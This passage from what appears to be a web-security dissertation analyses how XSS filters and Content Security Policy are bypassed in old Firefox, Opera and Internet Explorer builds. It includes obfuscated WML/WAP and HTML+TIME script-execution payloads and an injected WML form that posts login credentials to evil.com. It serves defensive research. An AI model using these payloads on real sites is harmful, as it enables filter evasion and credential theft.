+    A second possibility to bypass CSP would be to make sure that the white-listing feature allowed JavaScript, whilst it is at the same time combined with common website tracking scripts. The JavaScript files included by Google Analytics for instance are usually loaded directly from the Google domains. 
+    To combine CSP and Google Analytics on one website, a developer would have to white-list the Google Analytics domain to allow the JavaScript to execute. An attacker could simply create a Google Analytics account and link it to his attack vector. After that, the Google Analytics tool can theoretically be used to harvest data. This example remains theoretical as long as Google Analytics requires a website owner to confirm usage of the analysis tools by placing a META tag in the markup of the website to analyze or upload an individually crafted file to confirm. The attack shows the potential of abusing white-lists for CSP bypasses. Once the attacker can control one of the white-listed domains, the protection is endangered. This attack has as well been developed by Heyes in 2011.\\
+
+    Another event we have reported to the Mozilla development team in 2009 was our achievement of bypassing the prohibition to use \textit{eval()}. The bypass was considerably easy and required no complex research. It was initiated by successfully blocking calling \textit{eval()} with a single parameter as soon as the CSP headers were in place and the CSP-enabled Firefox version available at that time was in use. Calling \textit{eval()} with two parameters nevertheless was permitted; since depending on the count of parameters, apparently a different code path was chosen. 
+    This code path was not covered by the CSP protection and we could execute eval.  A variant way of bypassing CSP was obtained through the string evaluation method available via the \textit{crypto} object present in Firefox implementations. The \textit{crypto} object features a method called \textit{crypto.generateCRMFRequest()}, which accepts a string as its fourth parameter~\footnote{MDN, \textit{generateCRMFRequest}, \url{https://developer.mozilla.org/en/JavaScript\_crypto/generateCRMFRequest} (Feb 2012)}. This string is being evaluated as well. As of now, the CSP protection did not embraced this way of evaluating strings. Nevertheless, these last two bypasses can be considered rather meaningless, since the eval prohibition is not meant to protect websites in an injection context, but should rather keep developers from using eval or eval-like functions such as \textit{setInterval}, \textit{setTimeout} and the \textit{Function} constructor parametrized with strings. Employing eval in production code is 
+often used in combination with concatenation.
+    This allows customization of the evaluated string, thus causing unnecessary DOMXSS vulnerabilities, such as those discussed in Section~\ref{subsubsec:5.4.4.domxss}. 
+
+    \subsection{Miscellaneous Bypasses}
+    \label{subsubsec:5.4.13.miscellaneous_bypasses}
+
+   Besides the aforementioned attack techniques, modern user agents provide an even larger attack surface by implementing half-specified and immature features. Moreover, they supply a large base of legacy code supporting techniques and interfaces marked as obsolete. Removing legacy code might often result in breaking parts of the web, so vendors usually opt for leaving those features intact. Not implementing early or half-baked specification drafts causes problems in terms of publicity as clearly no browser vendor can afford or risk the reputation damage arising from the lack of support for cutting-edge technology in early stages. The following paragraphs will provide a short overview of attacks that rely on either legacy code or early, and sometimes proprietary, implementations. This will show that an attacker greatly benefits from undocumented niche features when trying to bypass existing mitigation techniques.
+  
+    \subsubsection{Attacks Using Inline WML/WAP Code on Opera}
+    \label{subsubsec:5.4.13.1.attacks_using_inline_wap_code_on_opera}
+
+    While conducting our research, we have discovered that Opera is capable of rendering WML/WAP markup~\footnote{Open Mobile Alliance, \textit{WAP Forum Specifications}, \url{http://www.wapforum.org/what/technical.htm} (July 2003s)} inside HTML document fragments once a HTML file is supplemented with an appropriate XHTML MIME type. This means that an attacker has a whole new range of possible attacks at hand, by means of tags and attributes' employment, as well as exerting event handlers completely different to those in HTML documents. Several novel and mostly undocumented ways of executing JavaScript were identified. It is for instance possible to connect a redirection attempt with a timer and an event handler to cause a user interaction-free JavaScript execution vector. The code shown in Listing~\ref{lst:wap-wml-xss-opera} testifies to this attack technique. 
+  
+\begin{lstlisting}[captionpos=b,label=lst:wap-wml-xss-opera,caption=Executing JavaScript via WAP/WML]
+<card xmlns="http://www.wapforum.org/2001/wml">
+  <onevent type="ontimer">
+    <go href="javascript:alert(1)"/>
+  </onevent>
+  <timer value="1"/>
+</card>   
+\end{lstlisting}
+
+    Silin refined this attack as he noticed how an attacker can easily obfuscate the vector by adding uninitialized WML variables~\footnote{Silin, A., \textit{Obfuscated WML injection via undeclared WAP-ML Variables}, \url{html5sec.org/#83} (2011)}.
+    His attack vector has better capacity for bypassing XSS filters via complete obfuscation of the URI scheme \textit{javascript:}, as it is shown in Listing~\ref{lst:wap-wml-xss-opera-2}.
+
+\begin{lstlisting}[captionpos=b,label=lst:wap-wml-xss-opera-2,caption=Attack vector obfuscation via WAP/WML]
+<x:template xmlns:x="http://www.wapforum.org/2001/wml" 
+  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)
+"><x:timer value="1"/></x:template>  
+\end{lstlisting}
+    
+    Similar attack vectors developed with WAP/WML do not actually require JavaScript execution to unfold their malicious payload and potentially steal sensitive data. At the end of 2011, we have developed an attack vector capable of hijacking existing form submissions by utilizing a WAP/WML injection. The injection point is outside the form element and uses WML variables to access the data contained by the form elements, then map it to data-fields and execute a request to an external domain using those exact data-fields. The code shown in Listing~\ref{lst:wap-wml-xss-opera-3} guides the reader through the technical whereabout of this attack. Beware that this attack can be just as easily carried out by user agents that do not support JavaScript execution. For that reason, even blocking or disabling JavaScript will not effectively prevent data theft. A filter solution attempting to fend of WAP/WML injections has to be capable of providing a white-list of HTML elements that exclude the set of available WML 
+components.
+
+\begin{lstlisting}[captionpos=b,label=lst:wap-wml-xss-opera-3,caption=Stealing form element content via injected WAP/WML]
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+  <h1>Admin Login</h1>
+  <form action="//good.com" method="post">
+    <label>Username</label>
+    <input type="text" name="username" value="admin" />
+    <label>Password</label>
+    <input type="password" name="password" value="s3cr3t" />
+  </form>
+<!--injection-->	
+<wml xmlns="http://www.wapforum.org/2001/wml">
+  <card>
+    <do>
+      <go href="//evil.com/">
+	<postfield name="username" value="$(username)"/>
+	<postfield name="password" value="$(password)"/>	
+      </go>
+    </do>
+  </card>
+</wml>
+<!--/injection-->	
+</body>
+</html>
+\end{lstlisting}
+
+    \subsubsection{Attacks Using HTML+TIME on Internet Explorer}
+    \label{subsubsec:5.4.13.2.attacks_using_htmltime_code_on_ie}
+
+    Older versions of Microsoft Internet Explorer support a technology labeled HTML+TIME, which is a proprietary way to animate HTML elements and provide similar capabilities to the ones offered nowadays by the SVG mentioned in Section~\ref{subsubsec:5.4.10.attacks_using_svg} ~\footnote{W3C, \textit{Timed Interactive Multimedia Extensions for HTML}, \url{http://www.w3.org/TR/NOTE-HTMLplusTIME} (Sep 1998)}. HTML+TIME, specified and published in 1998, extends the list of supported tags and attributes. It can be activated for a web document by the utilization of namespaces, an import directive or an imported behavior rule via CSS. HTML+TIME increases the size of the attack surface for XSS and scripting attacks because it provides a plethora of new ways to execute JavaScript code. To name just a few, it includes the option of new event handlers and possibilities to connect link targets with JavaScript URIs. \\
+
+    One of these methods works similarly to the set and animate syntax available for SVG images and seems to be the original inspiration for this rather quirky notation. During our research, we have encountered several attack vectors allowing an adversary to bypass existing XSS filters by simply submitting HTML+TIME code containing heavily obfuscated and multiply encoded payload. The code displayed in Listing~\ref{lst:html-time-vectors} makes three example vectors known. Among them, two were developed by us and one was published by Silin for the HTML5 Security Cheatsheet~\footnote{Silin, A., \textit{HTML+TIME based XSS vectors}, \url{http://html5sec.org/?html+time} (2011)}.\\
+\\
+
+\begin{lstlisting}[captionpos=b,label=lst:html-time-vectors,caption=Executing obfuscated JavaScript via HTML+TIME; explanations are visible inline]
+<!-- using 'set' and the 'to' attribute to execute JavaScript via innerHTML -->
+1<set/xmlns=`urn:schemas-microsoft-com:time` 
+  style=`beh&#x41vior:url(#default#time2)` 
+  attributename=`innerhtml` 
+  to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
+
+<!-- using 'animate' and the 'to' attribute to execute JavaScript via innerHTML -->
+1<animate/xmlns=urn:schemas-microsoft-com:time 
+  style=behavior:url(#default#time2) attributename=innerhtml 
+  values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
+
+<!-- using 'onbegin' and heavy obfuscation to execute JavaScript -->
+1;--<?f><l￦:!!:x\‮/st
+yle=`b&#x5c;65h\0061vIo\r/ĸ :url(#def&#x61ult#time2)\ö/';'`￦
+/onbegin= &#x5bµ=\u00&#054;1le&#114t&#40&#x31)&#x5d&#x2f/&#xyŧ\>
+\end{lstlisting}
+
+  Given the fact that SVG succeeded as standard for SMIL-like synchronized multi-media for websites and the number of websites actually using HTML+TIME was vanishingly small, HTML+TIME was deactivated in more recent versions of Internet Explorer~\footnote{W3C, \textit{Synchronized Multimedia}, \url{http://www.w3.org/AudioVideo/} (Dec 2008)}. This information notwithstanding, the market share of Internet Explorer 8 was still significantly high at the time of this thesis' production (~25\% according to StatOWL~\footnote{StatOWL, \textit{Browser market share and market penetration by version}, \url{http://www.statowl.com/web_browser_market_share.php} (Dec 2011)}). A server-side protection library should therefore be fully cognizant of the numerous ways an attacker can inject and execute active content by using HTML+TIME. Especially black-list-based filter systems will need to drastically extend their filter rules to be capable to catch injections composed under the auspices of this rare and quirky HTML dialect.\
+\
+
+  Deeper analysis of the HTML+TIME syntax yielded a fully valid XSS filter bypass for Internet Explorer 8. It turned out that the import directive markup can be composed in different ways than mentioned by the MSDN documentation~\footnote{MSDN, \textit{Introduction to HTML+TIME}, \url{http://msdn.microsoft.com/en-us/library/ms533099(v=vs.85).aspx} (Dec 2011)}: While the documents state the import directive needs to be formulated with a prepended question-mark (U+003F), we have revealed that this character might also be omitted. The code in Listing~\ref{lst:html-time-bypass} points out two similar injections. One of them was capable of bypassing the IE8 XSS filter due to the lack of the question-mark character. The original vector was initially published by Silin~\footnote{Silin, A., \textit{Internet Explorer applying behavior via <import namespace}, \url{html5sec.org/#116}, (2011)} and the security advisories by the researchers of GreyMagic~\footnote{GreyMagic, \textit{GreyMagic Internet Explorer Security 
+Research}, \url{http://www.greymagic.com/security/advisories/ie.shtml} (April 2005)}.\\
+
+\begin{lstlisting}[captionpos=b,label=lst:html-time-bypass,caption=Bypassing the IE8 XSS filter via HTML+TIME import directives; explanations are visible inline]
+<!-- Attack detected by IE8 XSS filter -->
+<div id="x">x</div>
+<xml:namespace prefix="t">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" targetElement="x" 
+  to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">0
+
+<!-- Attack not detected by IE8 XSS filter (note trhe <import> directive) -->
+<div id="x">x</div>
+<xml:namespace prefix="t">
+<import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" targetElement="x" 
+  to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;">
+\end{lstlisting}
+
+  \section{The Visibility Problem}
+  \label{subsec:5.5.the_visibility_problem}
+
+  As described in Section~\ref{subsubsec:5.4.4.domxss}, the visibility of scripting attacks for potential defensive systems highly depends on the way in which it is being carried out. We can distinguish between three major aspects an attacker can utilize to hinder a security tool from being able to perceive and understand incoming data and thereby compromise the security promise of reliable input filtering and protection against scripting web attacks. The items comprising this short list are: 
+
+\begin{itemize}
+  %
+ \item \textbf{Attacks incoming on more highly situated layers} Some attack techniques bypass server-side protection systems because they simply do not yield any server requests and do not require HTTP or similar protocols to be carried out. This includes DOMXSS as well as the attacks against plug-in content, such as Flash files for example. An attacker can simply load a website with benign parameters to then only have these parameters change to compose the attack, that are not being sent to any server or comparable instance. Those attacks cannot be mitigated by server-side defense systems or installations residing below the client-side application layer. Our research showed that even browser-based XSS filters are often incapable of detecting attacks by matching browser-rendered markup and content in the address bar. This is due to the fact that not all information is being transported properly across these sub-layers.
+  %
+ \item \textbf{Attacks using string obfuscation} Several defense mechanisms, especially those attempting to fend of scripting attacks, make use of signature-based approaches to detect the ``known bad''. Several PHP and Java-based XSS filters orchestrate a black-list of potentially harmful substrings, analyze incoming data based on these substrings and selectively remove potentially dangerous content. Similar approaches can be observed within common JavaScript analysis and sand-boxing approaches. Many of those examine string data for common patterns and consequently wrap the assumed executables into safe execution environments. As mentioned in Section~\ref{subsubsec:5.4.2.obfuscation}, we have tested and further developed several obfuscation techniques to bypass those filters. Obfuscation has proven to be a rather primitive yet often successful bypass technique. We consider attacks using deprecated and unknown legacy features obfuscation-based bypasses as well, since using rarely known dialects to represent 
+payload in a way am IDS will not recognize it can be considered strongly related to an actual obfuscation. Furthermore, attacks using quirky charsets, as mentioned in Section~\ref{subsubsec:5.4.11.attacking_weak_charsets} are categorized as also filed under obfuscation. Among the bypass techniques in question, fragmented XSS, as discussed in Section~\ref{subsubsubsec:5.4.6.4.fragmented_xss}, is also present. Since the payload is split into too many parts so that signature-based filter systems cannot create successful matches between the incoming data and existing heuristics, those attacks can often operate undetected by filtering systems.
+  %
+ \item \textbf{Impedance Mismatches and Mutation Attacks} Parser bugs and inconsistencies in modern user agents often allow an attacker to submit payload and exploit-code that will be of unsuspicious nature during its traversal through the layers from server to client but mutate after being rendered and processed by the user agents. Section~\ref{subsubsec:5.4.8.attacks_using_innerhtml} and following sections are dedicated to this attack technique. We have employed this technique to bypass high-end filter systems such as the HTMLPurifier, AntiSamy and other XSS filters. These attacks can be considered the most problematic aspect in bypassing filters because the attack vectors are basically standards-conforming markup. As a matter of course, neutering possibly malicious content might cripple valid user data. A protection library cannot rely on a written and approved standard anymore, but needs to actually learn about any possible parser bug of any potentially important user agent to stand a chance of providing 
+decent levels of protection. This task can be considered almost impossible. Most of the parser bugs mentioned in this work are usually unknown to the vendors themselves. They often get discovered by accident or thorough research, even years after the browser has been developed and released.
+\end{itemize}
+
+  Existing XSS and attack filters working on the server- and browser-side layers thus face one major problem, which boils down to the enormous capabilities of modern user agents and browser-like software. The rich cornucopia of features available for developers as well as attackers to choose from, the drastically increased complexity of the tasks user agents have to solve causes an increase in errors in the implemented features. Those errors provoke further gaps between the promised protection of server-side filtering tools and the reality of bypass possibilities. Furthermore, the majority of protection mechanisms can be considered to have been designed and installed based on the ``single point of failure'' anti-pattern (SPOF)~\footnote{Fisher, M., \textit{Scaling \& Availability Anti-patterns}, \url{http://akfpartners.com/techblog/2009/05/12/scaling-availability-anti-patterns/} (May 2009)}. Once they have been circumvented, few to no security restrictions apply and the attacker has free access to all 
+sensitive DOM properties and can effectively remote control the victim and get access to almost arbitrary data. Sadly, none of the mitigation techniques discussed here provide effective ways to prevent post-exploitation or attempts to tear up a trusted DOM in attempts to install client-side security where it has maximum visibility -- in the DOM itself.
+
+  \section{Recapitulation and Outlook}
+  \label{subsec:5.7.recapitulation_and_outlook}
+
+  The preceding sections have aimed to provide an overview on the ways and techniques that attackers apply to weaken, bypass and ultimately break the existing high-end attack mitigation systems protecting web applications. Most of the attacks introduced and discussed in this chapter rely on a simple problem, which comes down to the lack of visibility for the protective system to effectively forbid detection and thereby prevention of the attack. Being the most complex, powerful and acting almost as full stack operating systems, the browsers implement several security mechanisms. Those include memory protection, additional abstraction layers between website and operating system, security zones and, in related matters, the Same Origin Policy. XSS filters on client- and server-side attempt to analyze, match and judge incoming data, effectively protecting users from privacy invasions and malware attacks. Security extensions, such as NoScript, attempt to close a whole range of security flaws in modern user agents 
+and install barriers between local resources and web content. Their goal is to enforce encrypted communication and prevent XSS as well as drive-by download attacks. Unfortunately, once an attacker manages to bypass all those layers, the browser exposes a fully unprotected and accessible DOM. Most of the sensitive data that a website requires to authenticate users, store persistent information and implement use cases or visual feedback, are then in the hands of an attacker, almost without any restrictions. Additionally, with the constant dynamic specification of new technologies, more and more new features which potentially hold sensitive data and enable new attack vectors are added into user agents every day. This situation is surprising in a sense that the path to the DOM containing the secrets an attacker often desires to possess is guarded by a plethora of protection systems, each with their own specific blind spot. The DOM itself is fully open and accessible if the attacker crafted a vector competent to 
+trick those blind spots and bypass IDS, filter and defense mechanisms.\\
+
+  The following chapters of this dissertation will describe a first and very important step in thriving towards a protected DOM. That is to say a DOM that is not helpless after its guards have been bypassed. We introduce, extensively discuss and evaluate an approach to move the last line of defense to the layer where the actual attack vector executes -- the DOM itself. While the formerly discussed and bypasses protection techniques can only defend against known bad, we attempt to define a future approach for a DOM-based white-list driven monitoring and proxy approach. Ideally, this will allow a developer to easily define a protection against successful IDS and filter bypasses. Afterwards, it should enable a construction of a strong and self-protecting defense system, capable of managing access, detecting attacks and preventing the consequences of a successful bypass of protection residing on the underlying layers.
+
+\pagebreak
